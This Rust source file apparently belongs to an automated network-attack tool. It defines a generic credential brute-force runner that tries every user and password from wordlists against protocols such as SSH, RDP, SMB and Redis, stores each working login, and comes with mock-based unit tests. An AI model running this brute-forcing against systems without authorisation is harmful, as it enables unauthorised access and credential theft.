pub mod ftp;
pub mod http_basic;
pub mod mongo;
pub mod mqtt;
pub mod postgres;
pub mod rdp;
pub mod redis;
pub mod smb;
pub mod snmp;
pub mod sql;
pub mod ssh;
pub mod telnet;
pub mod vnc;

use std::sync::Arc;
use std::time::Duration;

use tokio::sync::Semaphore;

use crate::actions::{Action, ActionOutcome, Target};
use crate::state::AppState;

/// Trait implemented by each protocol connector.
/// Only the `try_connect` method differs between protocols.
pub trait Connector: Send + Sync {
    /// Attempt a single login. Returns `true` on success.
    fn try_connect(
        &self,
        ip: &str,
        port: u16,
        user: &str,
        password: &str,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = bool> + Send + '_>>;
}

/// Generic brute-force runner that works with any `Connector`.
///
/// Eliminates the ~80% code duplication across the 6 Python connector modules.
/// Loads user/password wordlists, iterates all combinations, stores found credentials.
pub struct BruteForceAction<C: Connector> {
    connector: C,
    action_name: &'static str,
    protocol: &'static str,
    target_port: u16,
    parent: Option<&'static str>,
    concurrency: usize,
}

impl<C: Connector> BruteForceAction<C> {
    pub fn new(
        connector: C,
        action_name: &'static str,
        protocol: &'static str,
        target_port: u16,
        parent: Option<&'static str>,
        concurrency: usize,
    ) -> Self {
        Self {
            connector,
            action_name,
            protocol,
            target_port,
            parent,
            concurrency,
        }
    }

    /// Run brute-force against a target, storing credentials on success.
    async fn run_bruteforce(&self, target: &Target, state: &Arc<AppState>) -> ActionOutcome {
        let users = match load_wordlist(&state.paths.users_file).await {
            Ok(u) => u,
            Err(e) => {
                tracing::error!(%e, "failed to load users wordlist");
                return ActionOutcome::Failed(e.to_string());
            }
        };
        let passwords = match load_wordlist(&state.paths.passwords_file).await {
            Ok(p) => p,
            Err(e) => {
                tracing::error!(%e, "failed to load passwords wordlist");
                return ActionOutcome::Failed(e.to_string());
            }
        };

        let total = users.len() * passwords.len();
        tracing::info!(
            action = self.action_name,
            ip = %target.ip,
            port = self.target_port,
            combinations = total,
            "starting brute force"
        );

        let semaphore = Arc::new(Semaphore::new(self.concurrency));
        let mut found = false;

        for user in &users {
            for password in &passwords {
                // Check shutdown
                if state.shutdown.is_cancelled() {
                    tracing::info!("brute force interrupted by shutdown");
                    return if found {
                        ActionOutcome::Success
                    } else {
                        ActionOutcome::Failed("interrupted".to_string())
                    };
                }

                let Ok(_permit) = semaphore.acquire().await else {
                    return ActionOutcome::Failed("interrupted".to_string());
                };
                let success = self
                    .connector
                    .try_connect(&target.ip, self.target_port, user, password)
                    .await;

                if success {
                    tracing::info!(
                        action = self.action_name,
                        ip = %target.ip,
                        user = %user,
                        "credentials found"
                    );

                    // Store in knowledge base
                    let _ = state
                        .kb
                        .store_credential(
                            target.host_id,
                            self.protocol,
                            user,
                            password,
                            self.target_port,
                        )
                        .await;

                    found = true;
                    // Don't stop — keep trying to find more credentials
                }
            }
        }

        if found {
            ActionOutcome::Success
        } else {
            ActionOutcome::Failed("no credentials found".to_string())
        }
    }
}

impl<C: Connector + 'static> Action for BruteForceAction<C> {
    fn name(&self) -> &'static str {
        self.action_name
    }

    fn port(&self) -> Option<u16> {
        Some(self.target_port)
    }

    fn parent(&self) -> Option<&'static str> {
        self.parent
    }

    fn execute<'a>(
        &'a self,
        target: &'a Target,
        state: &'a Arc<AppState>,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = ActionOutcome> + Send + 'a>> {
        Box::pin(self.run_bruteforce(target, state))
    }
}

/// Load a wordlist file (one entry per line).
async fn load_wordlist(path: &std::path::Path) -> std::io::Result<Vec<String>> {
    let content = tokio::fs::read_to_string(path).await?;
    Ok(content
        .lines()
        .filter(|l| !l.is_empty())
        .map(String::from)
        .collect())
}

#[cfg(test)]
mod tests {
    use std::sync::Arc;

    use tempfile::TempDir;

    use super::*;
    use crate::actions::{Action, ActionOutcome, Target};
    use crate::config::{BjornConfig, PathConfig};
    use crate::state::{AppState, KnowledgeBase};

    // -----------------------------------------------------------------------
    // Mock connector
    // -----------------------------------------------------------------------

    struct MockConnector {
        valid_creds: Vec<(String, String)>,
    }

    impl MockConnector {
        fn always_fail() -> Self {
            Self {
                valid_creds: vec![],
            }
        }

        fn accepting(creds: Vec<(&str, &str)>) -> Self {
            Self {
                valid_creds: creds
                    .into_iter()
                    .map(|(u, p)| (u.to_string(), p.to_string()))
                    .collect(),
            }
        }
    }

    impl Connector for MockConnector {
        fn try_connect(
            &self,
            _ip: &str,
            _port: u16,
            user: &str,
            password: &str,
        ) -> std::pin::Pin<Box<dyn std::future::Future<Output = bool> + Send + '_>> {
            let matches = self
                .valid_creds
                .iter()
                .any(|(u, p)| u == user && p == password);
            Box::pin(std::future::ready(matches))
        }
    }

    // -----------------------------------------------------------------------
    // Test helpers
    // -----------------------------------------------------------------------

    async fn test_state_with_wordlists(
        users: &[&str],
        passwords: &[&str],
    ) -> (Arc<AppState>, TempDir) {
        let dir = TempDir::new().unwrap();
        let db_path = dir.path().join("test.db");
        let kb = KnowledgeBase::open(&db_path).await.unwrap();
        let paths = PathConfig::new(dir.path());
        paths.ensure_dirs().unwrap();

        // Write wordlist files
        let users_content = users.join("\n");
        tokio::fs::write(&paths.users_file, &users_content)
            .await
            .unwrap();

        let passwords_content = passwords.join("\n");
        tokio::fs::write(&paths.passwords_file, &passwords_content)
            .await
            .unwrap();

        let config = BjornConfig::default();
        let state = AppState::new(config, paths, kb);
        (state, dir)
    }

    fn make_target(host_id: i64) -> Target {
        Target {
            host_id,
            ip: "10.0.0.1".to_string(),
            mac_address: "aa:bb:cc:dd:ee:01".to_string(),
            hostname: None,
            ports: vec![22],
        }
    }

    fn make_action<C: Connector>(connector: C) -> BruteForceAction<C> {
        BruteForceAction::new(connector, "MockBrute", "mock", 9999, None, 4)
    }

    // -----------------------------------------------------------------------
    // 1. Always-failing connector → ActionOutcome::Failed
    // -----------------------------------------------------------------------

    #[tokio::test]
    async fn all_creds_fail_returns_failed() {
        let (state, _dir) =
            test_state_with_wordlists(&["admin", "root"], &["pass1", "pass2"]).await;
        let host_id = state
            .kb
            .upsert_host("aa:bb:cc:dd:ee:01", "10.0.0.1", None, true, "9999")
            .await
            .unwrap();

        let action = make_action(MockConnector::always_fail());
        let target = make_target(host_id);
        let outcome = action.execute(&target, &state).await;

        assert_eq!(
            outcome,
            ActionOutcome::Failed("no credentials found".to_string())
        );

        // No credentials should be stored
        let creds = state.kb.credentials(Some("mock")).await.unwrap();
        assert!(creds.is_empty());
    }

    // -----------------------------------------------------------------------
    // 2. Succeeds on specific creds → ActionOutcome::Success + credential in KB
    // -----------------------------------------------------------------------

    #[tokio::test]
    async fn matching_creds_returns_success_and_stores_credential() {
        let (state, _dir) = test_state_with_wordlists(&["admin", "root"], &["wrong", "toor"]).await;
        let host_id = state
            .kb
            .upsert_host("aa:bb:cc:dd:ee:01", "10.0.0.1", None, true, "9999")
            .await
            .unwrap();

        let action = make_action(MockConnector::accepting(vec![("root", "toor")]));
        let target = make_target(host_id);
        let outcome = action.execute(&target, &state).await;

        assert_eq!(outcome, ActionOutcome::Success);

        let creds = state.kb.credentials(Some("mock")).await.unwrap();
        assert_eq!(creds.len(), 1);
        assert_eq!(creds[0].username, "root");
        assert_eq!(creds[0].password, "toor");
        assert_eq!(creds[0].port, 9999);
    }

    // -----------------------------------------------------------------------
    // 3. Multiple valid credentials → all stored
    // -----------------------------------------------------------------------

    #[tokio::test]
    async fn multiple_valid_credentials_all_stored() {
        let (state, _dir) =
            test_state_with_wordlists(&["admin", "root"], &["admin123", "toor"]).await;
        let host_id = state
            .kb
            .upsert_host("aa:bb:cc:dd:ee:01", "10.0.0.1", None, true, "9999")
            .await
            .unwrap();

        let action = make_action(MockConnector::accepting(vec![
            ("admin", "admin123"),
            ("root", "toor"),
        ]));
        let target = make_target(host_id);
        let outcome = action.execute(&target, &state).await;

        assert_eq!(outcome, ActionOutcome::Success);

        let creds = state.kb.credentials(Some("mock")).await.unwrap();
        assert_eq!(creds.len(), 2);

        let pairs: Vec<(String, String)> = creds
            .iter()
            .map(|c| (c.username.clone(), c.password.clone()))
            .collect();
        assert!(pairs.contains(&("admin".to_string(), "admin123".to_string())));
        assert!(pairs.contains(&("root".to_string(), "toor".to_string())));
    }

    // -----------------------------------------------------------------------
    // 4. Empty wordlists → fails gracefully
    // -----------------------------------------------------------------------

    #[tokio::test]
    async fn empty_wordlists_returns_failed() {
        let (state, _dir) = test_state_with_wordlists(&[], &[]).await;
        let host_id = state
            .kb
            .upsert_host("aa:bb:cc:dd:ee:01", "10.0.0.1", None, true, "9999")
            .await
            .unwrap();

        let action = make_action(MockConnector::accepting(vec![("root", "toor")]));
        let target = make_target(host_id);
        let outcome = action.execute(&target, &state).await;

        // With 0 users * 0 passwords = 0 combinations, nothing is tried
        assert_eq!(
            outcome,
            ActionOutcome::Failed("no credentials found".to_string())
        );
    }

    #[tokio::test]
    async fn missing_wordlist_file_returns_failed() {
        let dir = TempDir::new().unwrap();
        let db_path = dir.path().join("test.db");
        let kb = KnowledgeBase::open(&db_path).await.unwrap();
        let paths = PathConfig::new(dir.path());
        // Do NOT create wordlist files or dirs
        let config = BjornConfig::default();
        let state = AppState::new(config, paths, kb);

        let host_id = state
            .kb
            .upsert_host("aa:bb:cc:dd:ee:01", "10.0.0.1", None, true, "9999")
            .await
            .unwrap();

        let action = make_action(MockConnector::always_fail());
        let target = make_target(host_id);
        let outcome = action.execute(&target, &state).await;

        assert!(
            matches!(outcome, ActionOutcome::Failed(msg) if !msg.is_empty()),
            "should fail with an error message when wordlist file is missing"
        );
    }

    // -----------------------------------------------------------------------
    // 5. Trait method accessors: name(), port(), parent()
    // -----------------------------------------------------------------------

    #[test]
    fn name_returns_action_name() {
        let action = make_action(MockConnector::always_fail());
        assert_eq!(action.name(), "MockBrute");
    }

    #[test]
    fn port_returns_target_port() {
        let action = make_action(MockConnector::always_fail());
        assert_eq!(action.port(), Some(9999));
    }

    #[test]
    fn parent_returns_none_when_not_set() {
        let action = make_action(MockConnector::always_fail());
        assert_eq!(action.parent(), None);
    }

    #[test]
    fn parent_returns_some_when_set() {
        let action = BruteForceAction::new(
            MockConnector::always_fail(),
            "ChildAction",
            "mock",
            9999,
            Some("ParentAction"),
            4,
        );
        assert_eq!(action.parent(), Some("ParentAction"));
    }
}
